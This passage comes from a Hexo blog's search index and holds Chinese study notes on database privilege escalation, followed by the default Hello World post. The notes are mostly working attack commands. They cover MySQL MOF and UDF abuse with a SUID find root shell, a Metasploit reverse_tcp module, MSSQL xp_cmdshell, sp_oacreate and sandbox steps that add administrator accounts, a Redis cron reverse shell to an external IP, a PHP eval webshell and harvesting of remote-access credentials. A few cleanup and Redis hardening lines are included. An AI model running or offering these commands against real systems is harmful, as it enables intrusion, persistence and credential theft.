crmsh">select load_file(<span class="hljs-string">&quot;C:/nullevt.mof&quot;</span>) into dumpfile <span class="hljs-string">&quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</span><br>这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，<br>所以我们用dumpfile导出一行数据。<br><br>该文件效果创建一个高权限用户（从上面脚本可知账号密码为  mofmof）<br>net <span class="hljs-keyword">user</span> <span class="hljs-title">username</span> /delete  删除用户删不掉<br><br><br><br><br><br><br><span class="hljs-comment"># 停止 winmgmt 服务</span><br>net <span class="hljs-literal">stop</span> winmgmt<br><span class="hljs-comment"># 删除 Repository 文件夹</span><br>rmdir /s /q C:\Windows\system32\wbem\Repository\<br><span class="hljs-comment"># 手动删除 mof 文件</span><br>del C:\Windows\system32\wbem\mof\good\nullevt.mof /F /S<br><br><span class="hljs-comment"># 删除创建的用户</span><br>net <span class="hljs-keyword">user</span> <span class="hljs-title">mofmof</span> /delete<br><span class="hljs-comment"># 重新启动服务</span><br>net <span class="hljs-literal">start</span> winmgmt<br><br></code></pre></td></tr></table></figure><h4 id="6-4、MSF实现"><a href="#6-4、MSF实现" class="headerlink" title="6.4、MSF实现"></a>6.4、MSF实现</h4><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/mysql/mysql_mof<br> <br># 设置payload<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br> <br># 设置目标 MySQL 的基础信息<br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhosts 192.168.1.2</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">username root</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">password root</span><br>run<br></code></pre></td></tr></table></figure><h4 id="6-5、收尾工作"><a href="#6-5、收尾工作" class="headerlink" title="6.5、收尾工作"></a>6.5、收尾工作</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-comment"># 停止 winmgmt 服务</span><br>net <span class="hljs-literal">stop</span> winmgmt<br> <br><span class="hljs-comment"># 删除 Repository 文件夹</span><br>rmdir /s /q C:\Windows\system32\wbem\Repository\<br> <br><span class="hljs-comment"># 手动删除 mof 文件</span><br>del C:\Windows\system32\wbem\mof\good\test.mof /F /S<br> <br><span class="hljs-comment"># 删除创建的用户</span><br>net <span class="hljs-keyword">user</span> <span class="hljs-title">hacker</span> /delete<br> <br><span class="hljs-comment"># 重新启动服务</span><br>net <span class="hljs-literal">start</span> winmgmt<br></code></pre></td></tr></table></figure><h2 id="二、MSSQL"><a href="#二、MSSQL" class="headerlink" title="二、MSSQL"></a>二、MSSQL</h2><h3 id="1、xp-cmdshell提权"><a href="#1、xp-cmdshell提权" class="headerlink" title="1、xp_cmdshell提权"></a>1、xp_cmdshell提权</h3><p>账号密码：sa&#x2F;admin</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">xp<span class="hljs-emphasis">_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。</span><br><span class="hljs-emphasis">如果用户拥有管理员sa权限则可以用sp_</span>configure重修开启它。<br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230427094638419.png" alt="image-20230427094638419"></p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230427094717800.png" alt="image-20230427094717800"></p><h4 id="1-1、执行"><a href="#1-1、执行" class="headerlink" title="1.1、执行"></a>1.1、执行</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">执行：<br>EXEC master<span class="hljs-selector-class">.dbo</span><span class="hljs-selector-class">.xp_cmdshell</span> <span class="hljs-string">&#x27;命令&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230426173523745.png" alt="image-20230426173523745"></p><h4 id="1-2、如果被关闭了"><a href="#1-2、如果被关闭了" class="headerlink" title="1.2、如果被关闭了"></a>1.2、如果被关闭了</h4><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs hsp">启用：<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><br>RECONFIGURE<span class="hljs-comment">;</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>RECONFIGURE<span class="hljs-comment">;</span><br><br>相应的关闭命令为 ↓↓↓↓↓↓↓↓↓↓↓<br>关闭：<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>reconfigure<span class="hljs-comment">;</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>reconfigure<span class="hljs-comment">;</span><br><br>下图为开关被关↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓<br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230426173451948.png" alt="image-20230426173451948"></p><h4 id="1-3、如果被删除了"><a href="#1-3、如果被删除了" class="headerlink" title="1.3、如果被删除了"></a>1.3、如果被删除了</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ;'"><br>1、判断xp_cmdshell是否存在<br> SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27;; <br>-- 结果为1 表示存在<br><br>2、删除扩展存储过过程xp_cmdshell的语句 <br> exec sp_dropextendedproc &#x27;xp_cmdshell&#x27;<br> <br>3、恢复cmdshell的sql语句 <br> exec sp_addextendedproc xp_cmdshell ,@dllname =’xplog70.dll’ <br><br>4、否则需上传c:\inetput\web\xplog70.dll后 <br> exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;<br></code></pre></td></tr></table></figure><h4 id="——————————–"><a href="#——————————–" class="headerlink" title="——————————–"></a>——————————–</h4><h3 id="2、sp-oacreate提权"><a href="#2、sp-oacreate提权" class="headerlink" title="2、sp_oacreate提权"></a>2、sp_oacreate提权</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令。<br>启用：<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;   <br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;  <br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">1</span>;   <br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;   <br><br><br>关闭：<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;<br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;   <br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">0</span>;   <br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;  <br><br>执行：<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="3、SQL-Server-沙盒提权"><a href="#3、SQL-Server-沙盒提权" class="headerlink" title="3、SQL Server 沙盒提权"></a>3、SQL Server 沙盒提权</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><br><br><span class="hljs-comment">--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span><br><span class="hljs-keyword">exec</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">0</span>;<br><br><br><span class="hljs-comment">--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span><br><span class="hljs-keyword">exec</span> master.dbo.xp_regread <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>;<br><br><br><span class="hljs-comment">--执行系统命令</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell(&quot;net user qianxun 123456 /add&quot;)&#x27;</span>)<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell(&quot;net localgroup administrators qianxun /add&quot;)&#x27;</span>)<br><br><span class="hljs-comment">-- 恢复配置</span><br><span class="hljs-keyword">exec</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCALMACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">1</span>;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">0</span>;reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">0</span>;reconfigure;<br><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">沙盒模式SandBoxMode参数含义（默认是<span class="hljs-number">2</span>）<br><br><span class="hljs-number">0</span>：在任何所有者中禁止启用安全模式<br><br><span class="hljs-number">1</span> ：为仅在允许范围内<br><br><span class="hljs-number">2</span> ：必须在<span class="hljs-keyword">access</span>模式下<br><br><span class="hljs-number">3</span>：完全开启<br><br>openrowset是可以通过OLE DB访问<span class="hljs-keyword">SQL</span> <span class="hljs-keyword">Server</span>数据库，OLE DB是应用程序链接到<span class="hljs-keyword">SQL</span> <span class="hljs-keyword">Server</span>的的驱动程序。<br><br></code></pre></td></tr></table></figure><h3 id="navicat连接mssql注意"><a href="#navicat连接mssql注意" class="headerlink" title="navicat连接mssql注意"></a>navicat连接mssql注意</h3><p>报错缺少ODBC,请在navicat目录下安装下面这个</p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230426173035567.png" alt="image-20230426173035567"></p><h2 id="三、Redis"><a href="#三、Redis" class="headerlink" title="三、Redis"></a>三、Redis</h2><p>参考：<a href="https://blog.csdn.net/fly_hps/article/details/80937837">https://blog.csdn.net/fly_hps/article/details/80937837</a></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs stata">连接(未授权或有密码)-利用如下方法提权<br>采用未授权直接利用，密码进入需获取配置文件读取<br>1、设置键值为反弹命令的计划任务写法<br>2、设置写入目录为/<span class="hljs-keyword">var</span>/spool/cron/<br>3、设置写入文件名为yeyeye<br>4、保存执行<br><span class="hljs-keyword">set</span> x <span class="hljs-string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/47.114.103.63/7788 0&gt;&amp;1\n&quot;</span><br>config <span class="hljs-keyword">set</span> <span class="hljs-keyword">dir</span> /<span class="hljs-keyword">var</span>/spool/cron/<br>config <span class="hljs-keyword">set</span> dbfilename yeyeye<br><span class="hljs-keyword">save</span><br><br>(1).利用计划任务执行命令反弹<span class="hljs-keyword">shell</span><br>(2).写ssh-keygen公钥然后使用私钥登陆<br>(3).权限较低往web物理路径写webshell<br>修复方案：<br>注意：以下操作，均需重启 Redis 后才能生效。<br>绑定需要访问数据库的IP。 将127.0.0.1修改为需要访问此数据库的IP地址。<br>设置访问密码。在 Redis.<span class="hljs-keyword">conf</span>中requirepass 字段后，设置添加访问密码。<br>修改Redis服务运行账号。以较低权限账号运行Redis服务，禁用账号的登录权限。<br></code></pre></td></tr></table></figure><h2 id="四、其他-杂项"><a href="#四、其他-杂项" class="headerlink" title="四、其他_杂项"></a>四、其他_杂项</h2><h3 id="1、判断是否存在向日葵"><a href="#1、判断是否存在向日葵" class="headerlink" title="1、判断是否存在向日葵"></a>1、判断是否存在向日葵</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /svg<br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230427112800471.png" alt="image-20230427112800471"></p><h3 id="2、上传并且运行"><a href="#2、上传并且运行" class="headerlink" title="2、上传并且运行"></a>2、上传并且运行</h3><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230427112546620.png" alt="image-20230427112546620"></p><p>3、进行解密</p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230427144425969.png" alt="image-20230427144425969"></p><h3 id="3、运行解密脚本"><a href="#3、运行解密脚本" class="headerlink" title="3、运行解密脚本"></a>3、运行解密脚本</h3><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230427145300383.png" alt="image-20230427145300383"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><br><span class="hljs-comment">#三方应用-Teamviewer&amp;向日葵&amp;Navivat-凭据</span><br><span class="hljs-string">远控类：Teamviewer</span> <span class="hljs-string">向日葵</span> <span class="hljs-string">Todesk</span> <span class="hljs-string">VNC</span> <span class="hljs-string">Radmin</span> <span class="hljs-string">等</span><br><span class="hljs-string">密码类：各大浏览器</span> <span class="hljs-string">Xshell</span> <span class="hljs-string">Navicat</span> <span class="hljs-number">3389</span> <span class="hljs-string">等</span><br><span class="hljs-string">服务类：FileZilla</span> <span class="hljs-string">Serv-u</span> <span class="hljs-string">Zend等</span><br><span class="hljs-string">演示：</span><br><span class="hljs-number">1</span><span class="hljs-string">、用户：Teamviewer</span> <br><span class="hljs-number">2</span><span class="hljs-string">、Web用户：向日葵</span><br><span class="hljs-number">3</span><span class="hljs-string">、用户：Navicat</span><br><br></code></pre></td></tr></table></figure><h3 id="4、teamvierwer"><a href="#4、teamvierwer" class="headerlink" title="4、teamvierwer"></a>4、teamvierwer</h3><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230427150345953.png" alt="image-20230427150345953"></p><h3 id="5、navicat"><a href="#5、navicat" class="headerlink" title="5、navicat"></a>5、navicat</h3><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230427155654940.png" alt="image-20230427155654940"></p><h2 id="五、MYSQL数据库提权"><a href="#五、MYSQL数据库提权" class="headerlink" title="五、MYSQL数据库提权"></a>五、MYSQL数据库提权</h2><h4 id="1、自动化工具MDUT"><a href="#1、自动化工具MDUT" class="headerlink" title="1、自动化工具MDUT"></a>1、自动化工具MDUT</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">MDUT：   https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SafeGroceryStore/</span>MDUT <br></code></pre></td></tr></table></figure><h4 id="2、LiqunKit"><a href="#2、LiqunKit" class="headerlink" title="2、LiqunKit"></a>2、LiqunKit</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">综合高危漏洞利用工具(包含各大数据库)  https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Liqunkit/</span>LiqunKit_  <br></code></pre></td></tr></table></figure><h4 id="3、靶场演示"><a href="#3、靶场演示" class="headerlink" title="3、靶场演示"></a>3、靶场演示</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">https://www.vulnhub.com/entry/raven<span class="hljs-number">-2</span>,<span class="hljs-number">269</span>/<br>一、探针IP及端口<br>    nmap <span class="hljs-number">192.168</span><span class="hljs-number">.46</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span><br><br>二、利用phpmailer漏洞进行修改并反弹<br>    python D:/Myproject/<span class="hljs-number">40974.</span>py<br>    nc -lvvp <span class="hljs-number">4444</span><br><br>三、写入后门利用菜刀连接方便操作<br>    echo <span class="hljs-string">&#x27;&lt;?php eval($_POST[x]);?&gt;&#x27;</span> &gt;<span class="hljs-number">1.</span>php<br>    上传信息收集脚本进行提权信息收集<br>    ./LinEnum.sh<br>    翻阅数据库配置文件获取root密码<br>    <br><span class="hljs-number">1</span>、利用Mysql提权 searchsploit<br>下载mysql udf kali poc进行编译<br>wget https://www.exploit-db.com/download/<span class="hljs-number">1518</span><br>mv <span class="hljs-number">1518</span> raptor_udf.c<br>gcc -g -c raptor_udf.c<br>gcc -g -shared -o raptor_udf.so raptor_udf.o -lc<br>mv raptor_udf.so <span class="hljs-number">1518.</span>so<br><br><br><br>上传或下载<span class="hljs-number">1518</span>到目标服务器<br>wget https://xx.xx.xx.xx/<span class="hljs-number">1518.</span>so<br><br>进入数据库进行UDF导出<br>use mysql;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> foo(<span class="hljs-type">line</span> blob);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> foo <span class="hljs-keyword">values</span>(load_file(<span class="hljs-string">&#x27;/tmp/1518.so&#x27;</span>));<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> foo <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;<span class="hljs-number">0</span><br><br><br>开启root外联命令：<br>    <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;R@v3nSecurity&#x27;</span> <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">OPTION</span>;flush <span class="hljs-keyword">privileges</span>;<br><br><br>创建do_system函数调用<br>    <span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> do_system <span class="hljs-keyword">returns</span> <span class="hljs-type">integer</span> soname <span class="hljs-string">&#x27;1518.so&#x27;</span>;<br>    <span class="hljs-keyword">select</span> do_system(<span class="hljs-string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);<br><br>#配合使用find调用执行<br>    touch yeyeye<br>    find yeyeye –exec &quot;whoami&quot; \;<br>    find yeyeye –exec &quot;/bin/sh&quot; \;<br>    id<br><br> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全技术</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2020/07/07/hello-world/"/>
    <url>/2020/07/07/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全技术</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
